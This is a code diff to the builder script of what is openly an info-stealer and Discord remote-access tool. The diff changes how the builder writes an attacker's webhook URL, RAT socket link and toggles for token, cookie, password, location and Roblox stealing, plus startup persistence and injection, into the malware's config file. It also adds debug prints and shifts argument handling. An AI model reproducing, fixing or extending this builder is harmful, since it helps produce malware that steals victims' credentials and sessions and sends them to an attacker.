@@ -72,7 +72,7 @@ class _Builder():
     def edit_config(self):
         with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
             text = f.read()
-            new = text.replace("HOOK", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}").replace("startup = False", f"startup = {self.is_startup}").replace("self.injection = False", f"self.injection = {self.is_injection}").replace("self.token_stealing = False", f"self.token_stealing = {self.is_tokensteal}").replace("cookie_stealing = False", f"cookie_stealing = {self.is_cookiesteal}").replace("password_stealing = False", f"password_stealing = {self.is_passwordsteal}").replace("malicious_stealing = False", f"malicious_stealing = {self.is_malicioussteal}").replace("location_stealing = False", f"location_stealing = {self.is_locationssteal}").replace("roblox_stealing = False", f"roblox_stealing = {self.is_robloxsteal}")
+            new = text.replace('VMHOOK', f'{self.webhook_url}').replace("WEBHOOK_URL", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}").replace("startup = False", f"startup = {self.is_startup}").replace("self.injection = False", f"self.injection = {self.is_injection}").replace("self.token_stealing = False", f"self.token_stealing = {self.is_tokensteal}").replace("cookie_stealing = False", f"cookie_stealing = {self.is_cookiesteal}").replace("password_stealing = False", f"password_stealing = {self.is_passwordsteal}").replace("malicious_stealing = False", f"malicious_stealing = {self.is_malicioussteal}").replace("location_stealing = False", f"location_stealing = {self.is_locationssteal}").replace("roblox_stealing = False", f"roblox_stealing = {self.is_robloxsteal}")
         print(new)
         with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
             f.write(new)
@@ -109,8 +109,9 @@ class _Builder():
             print(e)
             
 if len(sys.argv) > 1:
+    print(sys.argv)
+    print(sys.argv[1])
     _Builder(
-        sys.argv[0],
         sys.argv[1],
         sys.argv[2],
         sys.argv[3],
@@ -122,4 +123,5 @@ if len(sys.argv) > 1:
         sys.argv[9],
         sys.argv[10],
         sys.argv[11],
+        sys.argv[12],
     ).run()
